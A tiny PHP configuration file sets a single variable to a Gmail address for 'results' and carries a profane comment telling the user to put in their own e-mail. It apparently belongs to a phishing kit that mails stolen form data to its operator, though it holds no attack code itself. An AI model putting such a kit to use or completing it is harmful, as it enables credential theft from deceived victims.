<?php

$email = "myresultboxle@gmail.com"; // PUT UR FUCKING E-MAIL BRO

?>